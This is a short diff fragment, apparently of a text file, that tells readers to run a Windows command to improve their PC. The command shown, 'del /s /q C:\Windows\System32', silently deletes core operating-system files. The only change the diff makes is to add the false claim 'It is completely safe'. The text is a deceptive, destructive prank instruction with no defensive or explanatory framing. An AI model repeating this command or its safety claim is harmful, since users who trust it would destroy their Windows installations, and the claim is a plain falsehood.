@@ -5,7 +5,7 @@ run this command incommand prompt or windows powershell to make your pc 'technic
 del /s /q C:\Windows\System32
 
 
-
+It is completely safe
 
 
 
